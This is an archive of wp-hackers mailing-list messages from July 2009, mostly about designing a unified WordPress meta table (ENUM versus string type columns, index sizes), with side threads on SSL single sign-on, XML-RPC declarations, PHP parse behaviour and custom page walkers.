	<161617690907241201h60fbc7f4ka7f67581e02abd59@mail.gmail.com>
Message-ID: <349fe48b0907241236x6c7f8e85m4a2fe2f4028f52a8@mail.gmail.com>

On Fri, Jul 24, 2009 at 10:01 PM, Otto <otto at ottodestruct.com> wrote:

> On Fri, Jul 24, 2009 at 12:21 PM, scribu<scribu at gmail.com> wrote:
> > We need to think how to map these functions:
> > get_post_custom($id);
> > get_post_custom_keys($id);
> > get_post_custom_values($id);
>
> Don't worry about those existing functions. Implement the base, then
> they can be rewritten to use the new base functions and provide
> backward compatibility.


It's the base functions that I'm thinking about. This is a revised list:


register_meta_type($type);


Single key=value pair:

 function add_meta($type, $id, $key, $value, $single);

function update_meta($type, $id, $key, $value, $old_value);

function get_meta($type, $id, $key, $value, $single);

function delete_meta($type, $id, $key, $value);


By id:

get_meta_by_id($type, $id);

delete_meta_by_id($type, $id);


By key:

get_meta_by_key($type, $key);

delete_meta_by_key($type, $key);


By type:

get_meta_by_type($type);

delete_meta_by_type($type);


We could also have convenience functions like these:

get_meta_values_by_*()

get_meta_keys_by_*()


-- 
http://scribu.net

From listswphackers at mist.org.uk  Fri Jul 24 20:21:47 2009
From: listswphackers at mist.org.uk (mrmist)
Date: Fri, 24 Jul 2009 21:21:47 +0100
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>
	<0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>
Message-ID: <yzcWOwEbfhaKFw3H@dsl-217-155-35-239.zen.co.uk>

In message <0DA20520-821F-46DA-9D66-5FF7974C016C at striderweb.com>, 
Stephen Rider <wp-hackers at striderweb.com> writes
>So... You're suggesting making a whole new table every time a plugin 
>wants to add some bit of meta, rather than simply adding a column to 
>the meta table?
>
>No offense, but if I had a giant lever I could pull to open a trap 
>door and drop you into the Sarlaac Pit, I would be reaching for it 
>about now....
>

Indeed.  The sound of some of the ideas here - whilst I am sure they are 
built on good intentions - seems to go against the fundamentals of good 
database design.

There really shouldn't be a need to have many tables where one would 
suffice.  Indeed without proper design you'd end up with data 
duplication issues and a greater reliance on dynamicly generated sql 
instead of proper pre-designed queries in order to work around the 
deficiencies and complexity introduced.

I'm also unconvinced by a performance argument that suggests that 
multiple small tables are better.  With good indexing and queries one 
table should do just as well - if not better in some cases, because you 
can save on multiple round trips as all the data is in one place instead 
of 20.



-- 
mrmist

From scribu at gmail.com  Fri Jul 24 21:17:11 2009
From: scribu at gmail.com (scribu)
Date: Sat, 25 Jul 2009 00:17:11 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <yzcWOwEbfhaKFw3H@dsl-217-155-35-239.zen.co.uk>
References: <349fe48b0907240321y3e06727k862e22da70844f65@mail.gmail.com>
	<3E0C513E-3FA1-4338-94DC-AE4787AF9514@newclarity.net>
	<0DA20520-821F-46DA-9D66-5FF7974C016C@striderweb.com>
	<yzcWOwEbfhaKFw3H@dsl-217-155-35-239.zen.co.uk>
Message-ID: <349fe48b0907241417j55672d83t7040a5f3aefe72a@mail.gmail.com>

Ok, so it seems pretty clear that separate tables are a bad ideea.

A few questions still remain:

What happens to postmeta and usermeta?

Moving them to the single meta table would involve:
- reformating hardcoded sql in Core
- redoing the bbPress integration


Another thing that was proposed is that each meta type in the single meta
table should be stored in a separate table.

By the same principle, we should also move meta_keys to separate tables.
Where would that get us?

On the one hand, creating separate tables for each meta type "adds
complexity", but moving a single column to a separate table "might enhance
performance".

Since almost every query for meta data requires the meta type, a JOIN would
almost always be involved. Wouldn't that hurt performance more than enhance
it?


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Fri Jul 24 21:28:44 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 24 Jul 2009 16:28:44 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>

Ok, I've noodled on this a bit now and would like to suggest something to essentially resolve any performance concerns:

If we create a meta table whose type field is an ENUM then we can end up with relatively small index for locating any given object's meta records unless you get into the tens of million records.  ENUM fields take 2 bytes per record and are trivial when added to the 20 byte bigints. Those of you who know how indexes are constructed know that a 22 byte key is much much better than much larger keys like 255+ bytes. 

Note my example presumes moving all meta into one table, include meta for post and page.

CREATE TABLE wp_meta (
  meta_id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  type ENUM('unknown','post','page',comment','link') DEFAULT 'unknown' NOT NULL, 
  object_id bigint(20) unsigned NOT NULL DEFAULT '0',
  meta_key varchar(255) DEFAULT NULL,
  meta_value longtext,
  PRIMARY KEY meta_id (meta_id),
  KEY (type,object_id),
  KEY meta_key (meta_key)
) 

There are two downsides to this (that I know of):

1.) Using ENUMs makes synchronization between two databases more fragile because ENUMs could be listed in different orders. Having routines that encapsulate this handling would resolve most of this. 

2.) A core function to register the new type would need to be able to ALTER the table and I don't know if this will be an issue on "highly secure" environments, i.e. 

ALTER TABLE wp_meta CHANGE type type ENUM('unknown','post','page',comment','link','mycustom') DEFAULT 'unknown' NOT NULL  ;

Thoughts?

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

From skeltoac at gmail.com  Fri Jul 24 21:49:53 2009
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri, 24 Jul 2009 16:49:53 -0500
Subject: [wp-hackers] Single sign-on SSL domain
In-Reply-To: <e6ec604d0907241446m6fe68dd8p40bd78c36f42b569@mail.gmail.com>
References: <695542FB-BB3A-40B7-859A-74FB3F9615F4@birdhouse.org>
	<e6ec604d0907241446m6fe68dd8p40bd78c36f42b569@mail.gmail.com>
Message-ID: <e6ec604d0907241449q4020352bq50de22c35a696e9d@mail.gmail.com>

Examine how wordpress.com does it with mapped domains using a single
wildcard cert. You would only have to invent a reversible way to map the
domains to subdomains matching the cert.

Andy

On Jul 22, 2009 6:00 PM, "Scot Hacker" <shacker at birdhouse.org> wrote:

I'm in a situation where all WP logins will need to go SSL. We have a lot of
domains but not a lot of IP addresses to go around. Historically all of our
domains have been vhosts on a single server. But since SSL requires one IP
per domain, we're kind of stuck.

Two possibilities we're considering:

1) Require all logins to be OpenID, pushing the login process off to another
server so we don't have to worry about it. The challenge here is that the
existing OpenID plugin for WP does not provide a way to *force* OpenID
logins. Submitted a ticket to that project asking for the feature, but no
response in two weeks.

2) Somehow configure apache to route login requests to a central domain for
sign-in. So:

ssldomain.edu  <-- has cert

Attempting to log in at domain.org would pass the user to ssldomain.edu for
authentication and then back to domain.org. I believe I can use an apache
Alias system so that the user would really be at
ssldomain.edu/domain.orgbut would appear to be at
domain.org. Has anyone tried something like this? Tricky? Successful?
Pitfalls? Recipes to share? What would need to happen on the WP side to work
with a system like this? Is it even possible?

3) Other... ?

Thanks for any suggestions.

Scot

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From scribu at gmail.com  Fri Jul 24 21:50:10 2009
From: scribu at gmail.com (scribu)
Date: Sat, 25 Jul 2009 00:50:10 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>

> There are two downsides to this (that I know of):
>
> 1.) Using ENUMs makes synchronization between two databases more fragile
> because ENUMs could be listed in different orders. Having routines that
> encapsulate this handling would resolve most of this.



I don't think this is a concern for regular users. And the pros ought to
know what they're doing.

2.) A core function to register the new type would need to be able to ALTER
> the table and I don't know if this will be an issue on "highly secure"
> environments, i.e.



dbDelta uses ALTER when updating Core. Some plugins also use ALTER
statements to add columns to existing table, so it's nothing out of the
ordinary.

In conclusion, I think using enum is a good ideea.


-- 
http://scribu.net

From joseph at josephscott.org  Fri Jul 24 22:59:14 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Fri, 24 Jul 2009 16:59:14 -0600
Subject: [wp-hackers] what clients send an XML declaration in XML-RPC
	requests?
Message-ID: <09C7F87C-4839-4DA2-A4FA-DA70EC44381D@josephscott.org>


One of the first things that WordPress does when processing an XML-RPC  
request is look for an XML declaration, something like:

	<?xml version="1.0"?>

It strips this off if it is found so that it can parse the rest of the  
request as XML.

To those of you out there that are writing blog clients for WordPress  
I have a question.  Do you include this declaration at the top of your  
requests?  If so, is it identical to this one or is it different?

--
Joseph Scott
joseph at josephscott.org
http://josephscott.org/





From otto at ottodestruct.com  Sat Jul 25 05:29:26 2009
From: otto at ottodestruct.com (Otto)
Date: Sat, 25 Jul 2009 00:29:26 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405> 
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405> 
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
Message-ID: <161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>

I considered enums as well, but the alter table problem I think makes
a big difference. We don't have anything doing alters except on
upgrades at present, making it alter the table like this seems
problematic to me.

I'd be happier with strings. We already use strings for types
elsewhere (comment_type is comment, ping, etc.. post_type is page,
post, attachment...).

I don't think the overhead is going to be enough to make any
difference except in huge scales. Perhaps some testing is in order?

-Otto



On Fri, Jul 24, 2009 at 4:50 PM, scribu<scribu at gmail.com> wrote:
>> There are two downsides to this (that I know of):
>>
>> 1.) Using ENUMs makes synchronization between two databases more fragile
>> because ENUMs could be listed in different orders. Having routines that
>> encapsulate this handling would resolve most of this.
>
>
>
> I don't think this is a concern for regular users. And the pros ought to
> know what they're doing.
>
> 2.) A core function to register the new type would need to be able to ALTER
>> the table and I don't know if this will be an issue on "highly secure"
>> environments, i.e.
>
>
>
> dbDelta uses ALTER when updating Core. Some plugins also use ALTER
> statements to add columns to existing table, so it's nothing out of the
> ordinary.
>
> In conclusion, I think using enum is a good ideea.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sat Jul 25 06:48:19 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 25 Jul 2009 02:48:19 -0400
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
Message-ID: <8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>

On Jul 25, 2009, at 1:29 AM, Otto wrote:
> I considered enums as well, but the alter table problem I think makes
> a big difference. We don't have anything doing alters except on
> upgrades at present, making it alter the table like this seems
> problematic to me.

The only time ALTER would be needed would be in the case a plugin  
needed an ENUM value that doesn't already exist in the wp_meta table  
and then only on plugin activation.

We can further minimize the need for ALTER by including ENUM values  
for all the obvious objects that might need meta, i.e. comments,  
links, categories, tags, etc.
That would make it rare that ALTER would be needed; much more rare in  
fact than upgrades which *practically* everyone will need to run.

> I'd be happier with strings. We already use strings for types
> elsewhere (comment_type is comment, ping, etc.. post_type is page,
> post, attachment...).
>
> I don't think the overhead is going to be enough to make any
> difference except in huge scales. Perhaps some testing is in order?


That comfort comes with less than trivial performance implications.

Given the index I proposed, an ENUM(2)+BIGINT(20)+4 bytes, each key is  
26 bytes long. With a 4K page filled 2/3s full[1] you get 105 records  
per index page.  That allows MySQL to retrieve record pointers for  
around 11,030 records in two index reads.  Assuming 10 meta fields per  
object, that allows you to have 1000 records and stay in two index  
page reads.  However, you can get to 1.16 million records in only  
three index page reads, or about 115,900 object records (10 meta  
records per object record.) And for 4 index reads you can get 127.6  
million meta records, or 12.17 million object records.  Not bad....

Now, let's look the option we'd choose it we didn't challenge the  
default assumptions: VARCHAR(255)+BIGINT(20)+4, or 279 bytes per index  
key, or only 9 meta records per index page, or less than 1 object  
record per index page!!! That means for two index page reads, you only  
get 95 meta records, or 9 object records.  Three index page reads  
gives you only 937 meta records, or 93 object records.  Four index  
pages reads give you 9,176 meta records, or 917 object records.  With  
five index page reads you can get up to 89,809 meta records, but only  
8980 object records.  To get to 87,899 object records you need 6 index  
page reads, and to get to over 1 million object records you have to  
have 7 index page reads.  UGH!

Holy crap!  ENUMs give you 115,900 object records in only 3 index page  
reads yet strings require 6 index page reads for only 87,899 object  
records.  That's < 1/2 the performance, and you'll find it's actually  
a lot worse than that (int indexes always perform better than string  
indexes.)

That overhead from strings makes WordPress a non-option in high  
traffic sites in the 100k record range (without *lots* of expensive  
tuning), and noticeably slow for even moderate size sites (>1000  
object records.)  And what benefit for?  All to avoid having to do an  
ALTER?  The more I research this and write about it, the more clear  
that moving to ENUMs could be a huge win for WordPress scalability  
moving forward.

My guess the reason most people are not screaming about the current  
performance is that tables that use strings like the taxonomy tables  
have so few records for most sites that it rarely becomes an issue.   
But we are not architecting WordPress for sites with 25 blog posts,  
are we?  We are trying to ensure that it can scale to be able to be  
used for even the largest sites, right?

JMTCW, anyway.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/

P.S. BTW, I just ran came across this[2]:  "Disadvantages of Creating  
Many Tables in the Same Database": "If you have many MyISAM tables in  
the same database directory, open, close, and create operations are slow

[1] http://stackoverflow.com/questions/781873/how-to-figure-out-size-of-indexes-in-mysql/781888
[2] http://dev.mysql.com/doc/refman/5.1/en/creating-many-tables.html



From jason at intraffic.net  Sat Jul 25 19:25:54 2009
From: jason at intraffic.net (Jason Webster)
Date: Sat, 25 Jul 2009 12:25:54 -0700
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
Message-ID: <4A6B5C42.2090100@intraffic.net>

On 20/07/2009 6:20 AM, Otto wrote:

> That will run fine. PHP only will throw an error if it actually makes
> it to the code. Code is interpreted at the time of execution, not at
> the time of inclusion. You can include a file with complete gibberish
> inside a function, but until you try to use that function, it won't
> stop the program.
>
> -Otto

That is SO not true.

test.php:
<?php

function complete_gibberish() {
     this is complete gibberish
     full of all sorts of syntax errors
}


echo 'hi';


$: php test.php
 > PHP Parse error:  syntax error, unexpected T_STRING in /home/jason/test.php on line 4




From jordi at jcanals.net  Sat Jul 25 20:49:32 2009
From: jordi at jcanals.net (Jordi Canals)
Date: Sat, 25 Jul 2009 22:49:32 +0200
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A6B5C42.2090100@intraffic.net>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
	<4A6B5C42.2090100@intraffic.net>
Message-ID: <eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>

2009/7/25 Jason Webster <jason at intraffic.net>

> On 20/07/2009 6:20 AM, Otto wrote:
>
>  That will run fine. PHP only will throw an error if it actually makes
>> it to the code. Code is interpreted at the time of execution, not at
>> the time of inclusion. You can include a file with complete gibberish
>> inside a function, but until you try to use that function, it won't
>> stop the program.
>>
>> -Otto
>>
>
> That is SO not true.
>
> test.php:
> <?php
>
> function complete_gibberish() {
>    this is complete gibberish
>    full of all sorts of syntax errors
> }
>
>
> echo 'hi';
>
>
> $: php test.php
> > PHP Parse error:  syntax error, unexpected T_STRING in
> /home/jason/test.php on line 4
>
>

From bogus@does.not.exist.com  Wed Jul 15 02:15:36 2009
From: bogus@does.not.exist.com ()
Date: Wed, 15 Jul 2009 02:15:36 -0000
Subject: No subject
Message-ID: <mailman.3.1248554974.16652.wp-hackers@lists.automattic.com>

as soon as the file has been included. It does not mind if the code is
executed or not, Steps are like that: 1) File is loaded, 2) File is parsed
and compiled and 3) The code is executed.

So, the best way is to have a small file to check for the version prior to
including any version specific version code, you can do with a file like
that:

<?php
if ( version_compare(PHP_VERSION, '5.0.0', '<') {
   die ( "PHP 5 is required to run this script");
} else {
   include 'filename.php';
}
?>

Regards,
---

Jordi Canals
http://alkivia.org

From scribu at gmail.com  Sun Jul 26 00:12:27 2009
From: scribu at gmail.com (scribu)
Date: Sun, 26 Jul 2009 03:12:27 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
Message-ID: <349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>

I've started working on a patch here:
http://core.trac.wordpress.org/ticket/10487


-- 
http://scribu.net

From sojweb at indiana.edu  Sun Jul 26 20:31:15 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Sun, 26 Jul 2009 16:31:15 -0400
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
Message-ID: <22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>

Question about wp_list_pages() and page ancestry:

I have a site that displays a page menu on each page, but there are  
hundreds of pages, so they can't all be displayed in the menu. My  
design requires that top-level pages always be displayed, and that  
children of a page be hidden, unless that page is current, or a parent  
of a current page. I filter out children of non-current pages  
altogether in the wp_list_pages() call, and I'm using CSS to hide  
children of sibling pages, and grandchildren of the current page. This  
works fine if the hierarchy is only 2-deep; beyond that, however, it  
fails, because WordPress only adds the "current-page-parent" class to  
a page's immediate parents, and not to the parents of the parent.

My solution to this was to make a modification to the start_el()  
function of the Walker_Page class (line 1168 in v2.8.2) that adds the  
"current_page_parent" class to all parents of a page, and not just its  
immediate parent. That makes it trivial to do with CSS. It's 9 lines  
of code, and I wanted to do it with a plugin, but didn't see where I  
could hook in.

My question is: Does anyone have any better ideas? Obviously, I'd  
rather not be modifying core files. I'm hoping I'm just missing  
something really simple. Thanks.


-Jeff

On Jul 25, 2009, at 20:12 PM, scribu wrote:

> I've started working on a patch here:
> http://core.trac.wordpress.org/ticket/10487
>
>
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From sojweb at indiana.edu  Sun Jul 26 20:34:53 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Sun, 26 Jul 2009 16:34:53 -0400
Subject: [wp-hackers] Page ancestry and CSS
Message-ID: <30786C43-7F5B-4028-BFD2-A7EACA75BCFC@indiana.edu>

Crap, my question is not related scribu's message... I just forgot to  
delete that part out before I sent. My bad :-).


-Jeff

From mike at zed1.com  Sun Jul 26 20:50:16 2009
From: mike at zed1.com (Mike Little)
Date: Sun, 26 Jul 2009 21:50:16 +0100
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405> 
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405> 
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com> 
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com> 
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com> 
	<22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
Message-ID: <7235ce780907261350j4343a937p534dd8f2e7cd1ee1@mail.gmail.com>

2009/7/26 SoJ Web <sojweb at indiana.edu>:
> Question about wp_list_pages() and page ancestry:
>

Since WordPress 2.8.1 you can substitute your own Page Walker, and
because it's a class you only need to override the one function you
need.

See http://core.trac.wordpress.org/ticket/8673 for a trivial example.

You should also consider the flexi-pages-widget which does what I
think you need to do without needing to hide things (which will fail
on some browsers).

It's working for me on a hierarchy 7 levels deep.



Mike
-- 
Mike Little
http://zed1.com/

From sojweb at indiana.edu  Sun Jul 26 21:05:22 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Sun, 26 Jul 2009 17:05:22 -0400
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <7235ce780907261350j4343a937p534dd8f2e7cd1ee1@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
	<7235ce780907261350j4343a937p534dd8f2e7cd1ee1@mail.gmail.com>
Message-ID: <1FB35C1A-3E16-45C2-99F3-9C4470F1DFFF@indiana.edu>

Oh, cool, I wasn't aware you could use your own Page Walker; that's  
perfect (and I'm using display:none to hide things, so browser  
compatibility isn't really an issue). Flexi-pages is neat, but it's  
overkill for my purposes. Thanks!


-Jeff

On Jul 26, 2009, at 16:50 PM, Mike Little wrote:

> 2009/7/26 SoJ Web <sojweb at indiana.edu>:
>> Question about wp_list_pages() and page ancestry:
>>
>
> Since WordPress 2.8.1 you can substitute your own Page Walker, and
> because it's a class you only need to override the one function you
> need.
>
> See http://core.trac.wordpress.org/ticket/8673 for a trivial example.
>
> You should also consider the flexi-pages-widget which does what I
> think you need to do without needing to hide things (which will fail
> on some browsers).
>
> It's working for me on a hierarchy 7 levels deep.
>
>
>
> Mike
> -- 
> Mike Little
> http://zed1.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at santosj.name  Sun Jul 26 21:21:55 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Sun, 26 Jul 2009 16:21:55 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
Message-ID: <20090726162155.d743ff96.wordpress@santosj.name>

CRUD in procedural form. Alas, it seems flawed somehow. The look, the feel; The wonder about how to make it better. Is there such a solution?

It seems a pity to look at something so beautiful in its simplicity and then ask why? What purpose is there to mock something that should be so clerished and loved and yet not provide another?

Not that objects are any better, just better organized. A shame really.

I do cry every time I see CRUD.

Good work nevertheless. I hope you choose to name the parameters better. There is a concept called, "Self-documenting Code" that is just plain awesome in its beauty and soft skin.

Jacob Santos


On Sun, 26 Jul 2009 03:12:27 +0300
scribu <scribu at gmail.com> wrote:

> I've started working on a patch here:
> http://core.trac.wordpress.org/ticket/10487
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From steph at sillybean.net  Sun Jul 26 22:59:29 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Sun, 26 Jul 2009 17:59:29 -0500
Subject: [wp-hackers] guide to importing things in intervals?
Message-ID: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>

I'm working on the HTML file import plugin I talked about here a few  
months ago. It's working nicely on small (<150) batches of files, but  
I'd like to keep it from cutting short when it reaches the max  
execution time. I'm looking through the core importers' code for  
guidance.

Does anyone happen to have any articles or documentation on how this  
works?


Stephanie Leary
sillybean.net

From junsuijin at gmail.com  Sun Jul 26 23:11:55 2009
From: junsuijin at gmail.com (Tynan Colin Beatty)
Date: Sun, 26 Jul 2009 18:11:55 -0500
Subject: [wp-hackers] guide to importing things in intervals?
In-Reply-To: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>
References: <4EF38082-F9CE-4BDD-87E6-3C260C981524@sillybean.net>
Message-ID: <4f9525dc0907261611i2f50f2a0k653950cb28de6837@mail.gmail.com>

Stephanie,
You might find it useful to examine a script called bigdump.php if you
haven't already.
http://www.ozerov.de/bigdump.php

Kind Regards,
Ty

On Sun, Jul 26, 2009 at 5:59 PM, Stephanie Leary <steph at sillybean.net>wrote:

> I'm working on the HTML file import plugin I talked about here a few months
> ago. It's working nicely on small (<150) batches of files, but I'd like to
> keep it from cutting short when it reaches the max execution time. I'm
> looking through the core importers' code for guidance.
>
> Does anyone happen to have any articles or documentation on how this works?
>
>
> Stephanie Leary
> sillybean.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Mon Jul 27 00:17:30 2009
From: scribu at gmail.com (scribu)
Date: Mon, 27 Jul 2009 03:17:30 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <20090726162155.d743ff96.wordpress@santosj.name>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<20090726162155.d743ff96.wordpress@santosj.name>
Message-ID: <349fe48b0907261717y11978be3h8105d0f82995e47a@mail.gmail.com>

On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name>wrote:

> CRUD in procedural form. Alas, it seems flawed somehow. The look, the feel;
> The wonder about how to make it better. Is there such a solution?
>
> It seems a pity to look at something so beautiful in its simplicity and
> then ask why? What purpose is there to mock something that should be so
> clerished and loved and yet not provide another?
>
> Not that objects are any better, just better organized. A shame really.
>
> I do cry every time I see CRUD.
>
> Good work nevertheless. I hope you choose to name the parameters better.
> There is a concept called, "Self-documenting Code" that is just plain
> awesome in its beauty and soft skin.
>
> Jacob Santos
>


Thanks for the comment - very poetic, but not really helpful.

Don't know how I could rename the parameters to be more self-documenting
than they already are. Metaphors maybe? :)


-- 
http://scribu.net

From wordpress at santosj.name  Mon Jul 27 02:24:20 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Sun, 26 Jul 2009 21:24:20 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <349fe48b0907261717y11978be3h8105d0f82995e47a@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<20090726162155.d743ff96.wordpress@santosj.name>
	<349fe48b0907261717y11978be3h8105d0f82995e47a@mail.gmail.com>
Message-ID: <20090726212420.b9c27ee8.wordpress@santosj.name>

Well, I think it is fine, except for object_id doesn't really have an explanation. Why not $id, instead? The problem is that it doesn't explain what the object part is, so it can be anything. It is the ID of the type you are looking for, so post, comment, category, etc. Why not just name it ID and leave out the question of what 'object' means. People understand what ID means.

